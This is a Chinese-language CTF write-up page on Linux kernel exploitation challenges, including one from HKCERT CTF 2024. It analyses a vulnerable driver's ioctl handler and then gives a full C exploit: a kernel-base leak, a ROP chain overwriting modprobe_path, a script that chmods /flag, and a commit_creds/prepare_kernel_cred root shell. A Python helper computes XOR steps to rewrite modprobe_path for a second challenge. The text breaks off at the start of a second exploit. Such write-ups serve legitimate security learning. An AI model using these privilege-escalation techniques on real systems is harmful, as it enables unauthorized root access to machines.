<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122454-izhqudq.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122454-izhqudq.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="分析-ko-驱动-1"><span class="me-2">分析 .ko 驱动</span><a href="#分析-ko-驱动-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>ioctl 功能点分析</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919123607-afeq8i1.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919123607-afeq8i1.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>给了几个 gadget</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919123443-v8waqop.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919123443-v8waqop.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>漏洞点, RAX 指针内容可以被覆盖，</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919135913-y6q3hbk.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919135913-y6q3hbk.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919140008-6cmeb3o.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919140008-6cmeb3o.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h3 id="exploit学了一个新方法"><span class="me-2">exploit(学了一个新方法)</span><a href="#exploit学了一个新方法" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919162141-z7rtprk.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919162141-z7rtprk.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>直接 rop</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919164551-aubu99v.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919164551-aubu99v.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919164624-xtgt23p.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919164624-xtgt23p.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>‍</li>
</ul>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919193526-ell0kyg.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919193526-ell0kyg.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>exploit</li>
</ul>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">size_t</span> <span class="n">nokaslr_kernel_base</span>  <span class="o">=</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">commit_creds</span>         <span class="o">=</span> <span class="mh">0xffffffff810c5010</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">prepare_kernel_cred</span>  <span class="o">=</span> <span class="mh">0xffffffff810c5270</span><span class="p">;</span>


<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">save_status</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
    <span class="c1">//chmod("/flag",0777);</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="n">shell_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_root_shell</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"xor rdi, rdi;"</span>
        <span class="s">"mov rcx, prepare_kernel_cred;"</span>
        <span class="s">"call rcx;"</span>
        <span class="s">"mov rcx, commit_creds;"</span>
        <span class="s">"call rcx;"</span>
        <span class="c1">// swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp</span>
    <span class="p">);</span>
    <span class="c1">// restore_flags</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"push user_ss;"</span>
        <span class="s">"push user_sp;"</span>
        <span class="s">"push user_rflags;"</span>
        <span class="s">"push user_cs;"</span>
        <span class="s">"push shell_addr;"</span>
        <span class="s">"swapgs;"</span>
        <span class="s">"iretq;"</span>
    <span class="p">);</span>
<span class="p">}</span><span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">modprobe_rce</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/chmod 777 /flag</span><span class="se">\n</span><span class="s">' &gt; /tmp/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /tmp/e2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/e2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/tmp/e2"</span><span class="p">);</span>      <span class="c1">// sh: /tmp/e2: Permission denied</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/tmp/e2"</span><span class="p">);</span>      <span class="c1">// ./tmp/e2: line 1: : not found</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /flag"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /flag"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="n">save_status</span><span class="p">();</span>
    <span class="kt">char</span> <span class="n">procn</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/dev/test"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">procn</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>

    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span> <span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>

    <span class="kt">uint8_t</span> <span class="n">pwd</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc</span><span class="se">\x00</span><span class="s">"</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x20</span><span class="p">)</span>
        <span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xF9</span><span class="p">;</span>

    <span class="n">strncpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">pwd</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="n">show</span> <span class="o">=</span> <span class="mh">0xDEADBEEF</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">edit</span> <span class="o">=</span> <span class="mh">0xFEEDFACE</span><span class="p">;</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">show</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>

    <span class="n">i</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x230</span><span class="p">)</span>
        <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xF9</span><span class="p">;</span>

    <span class="n">hexdump</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x230</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>

    <span class="kt">size_t</span> <span class="n">ko_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="kt">size_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x336d60</span> <span class="o">-</span> <span class="mi">102</span><span class="p">;</span>

    <span class="n">lss</span><span class="p">(</span><span class="s">"ko_base"</span><span class="p">,</span> <span class="n">ko_base</span><span class="p">);</span>
    <span class="n">lss</span><span class="p">(</span><span class="s">"kernel_base"</span><span class="p">,</span> <span class="n">kernel_base</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span> <span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">pwd</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="o">*</span><span class="n">ropchain</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">modprobe_path_offset</span> <span class="o">=</span> <span class="mh">0x1864fc0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">pop_rdi</span> <span class="o">=</span>  <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81090c80</span> <span class="o">-</span> <span class="n">nokaslr_kernel_base</span><span class="p">;</span>  <span class="c1">// pop rdi; ret</span>
    <span class="kt">size_t</span> <span class="n">pop_rsi</span> <span class="o">=</span>  <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff811cc553</span> <span class="o">-</span> <span class="n">nokaslr_kernel_base</span><span class="p">;</span>  <span class="c1">// pop rsi; ret</span>
    <span class="kt">size_t</span> <span class="n">mov_rsi</span> <span class="o">=</span>  <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x7c550</span><span class="p">;</span>  <span class="c1">// native_set_pte</span>
    <span class="kt">size_t</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xc00ff0</span> <span class="o">+</span> <span class="mh">0x36</span><span class="p">;</span>
    <span class="c1">// cat gadget.txt | grep " \[rdi\], rsi" |grep "ret;"</span>

    <span class="kt">char</span> <span class="n">target</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/tmp/e1</span><span class="se">\x00</span><span class="s">"</span><span class="p">;</span>

    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">modprobe_path_offset</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rsi</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">target</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rsi</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">modprobe_rce</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>


    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">)</span>
        <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">ropchain</span><span class="p">)[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xF9</span><span class="p">;</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">edit</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>

<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>



</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="问题及感想1-1"><span class="me-2">问题及感想1</span><a href="#问题及感想1-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>有点时候会这样，参数对比上</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122715-f24pdmu.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122715-f24pdmu.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>nop 这里call 即可有助于分析</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122808-17iq8q5.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122808-17iq8q5.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122826-4vejq1d.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122826-4vejq1d.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="问题及感想2"><span class="me-2">问题及感想2</span><a href="#问题及感想2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>ropper 找到地用不了？(注意gadget 是不是在可执行段)</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>➜  Kylin_Driver ropper <span class="nt">--file</span> ./vmlinux <span class="nt">--nocolor</span> <span class="o">&gt;</span> gadget.txt
➜  Kylin_Driver <span class="nb">cat </span>gadget.txt|grep <span class="s2">": mov qword ptr </span><span class="se">\[</span><span class="s2">rdi</span><span class="se">\]</span><span class="s2">, rsi"</span> |grep <span class="s2">"ret"</span>

0xffffffff830f8f30: mov qword ptr <span class="o">[</span>rdi], rsi<span class="p">;</span> mov dword ptr <span class="o">[</span>rdx], eax<span class="p">;</span> mov eax, 1<span class="p">;</span> ret<span class="p">;</span>
0xffffffff830a47ac: mov qword ptr <span class="o">[</span>rdi], rsi<span class="p">;</span> mov qword ptr <span class="o">[</span>r9 - 8], rcx<span class="p">;</span> ret<span class="p">;</span>
0xffffffff830b39ea: mov qword ptr <span class="o">[</span>rdi], rsi<span class="p">;</span> ret<span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919164258-3auq8vi.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919164258-3auq8vi.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>​<code class="language-plaintext highlighter-rouge">native_set_pte</code>​ 有一个 <code class="language-plaintext highlighter-rouge">mov [rdi], rsi</code>​， 这个 ropper 没找到</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>0xffffffffa0e7c550 &lt;native_set_pte&gt;: mov    QWORD PTR <span class="o">[</span>rdi],rsi
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="flipper-hero"><span class="me-2">flipper-hero</span><a href="#flipper-hero" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>2024-11-09-HKCERT CTF 2024 <span class="o">(</span>Qualifying Round<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>nokaslr
任意地址内容异或
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241113135719-io3yt0l.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20241113135719-io3yt0l.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li><strong>深度优先搜索算法</strong></li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre>
<span class="n">l</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">]</span>
<span class="n">MAX_DEPTH</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">sd</span><span class="p">,</span> <span class="n">depth</span><span class="p">,</span> <span class="n">used</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">depth</span> <span class="o">&gt;</span> <span class="n">MAX_DEPTH</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>  <span class="c1"># 超过最大递归深度时返回 None
</span>
    <span class="k">if</span> <span class="n">src</span> <span class="o">==</span> <span class="n">dst</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">path</span>  <span class="c1"># 返回成功的路径
</span>
    <span class="n">best_path</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">xor_value</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">xor_value</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">used</span><span class="p">:</span>
            <span class="n">new_src</span> <span class="o">=</span> <span class="n">src</span> <span class="o">^</span> <span class="n">xor_value</span>
            <span class="n">new_used</span> <span class="o">=</span> <span class="n">used</span><span class="p">.</span><span class="nf">copy</span><span class="p">()</span>
            <span class="n">new_used</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">xor_value</span><span class="p">)</span>
            <span class="n">result</span> <span class="o">=</span> <span class="nf">f</span><span class="p">(</span><span class="n">new_src</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">path</span> <span class="o">+</span> <span class="p">[</span><span class="n">xor_value</span><span class="p">],</span> <span class="n">sd</span> <span class="o">^</span> <span class="n">xor_value</span><span class="p">,</span> <span class="n">depth</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">new_used</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">best_path</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">or</span> <span class="nf">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">best_path</span><span class="p">):</span>
                    <span class="n">best_path</span> <span class="o">=</span> <span class="n">result</span>  <span class="c1"># 更新最优路径
</span>    <span class="k">return</span> <span class="n">best_path</span>  <span class="c1"># 返回最优路径
</span>


<span class="c1"># 示例：将字符串从 '/sbin/modprobe' 转换为 '/tmp/e1\x00'
</span><span class="n">s</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/sbin/modprobe</span><span class="sh">'</span><span class="p">)</span>
<span class="n">d</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/home/ctf/e1</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">d</span><span class="p">)):</span>
    <span class="n">best_path</span> <span class="o">=</span> <span class="nf">f</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="p">[],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">set</span><span class="p">())</span>
    <span class="n">e</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">me_buf.ptr = target+</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">;</span><span class="sh">'</span><span class="p">);</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">best_path</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'''</span><span class="s">me_buf.idx = </span><span class="si">{</span><span class="n">l</span><span class="p">.</span><span class="nf">index</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="si">}</span><span class="s">;
ioctl(fd,0x13370001,&amp;me_buf);
</span><span class="sh">'''</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="exploit-c"><span class="me-2">exploit-c</span><a href="#exploit-c" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>exploit</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
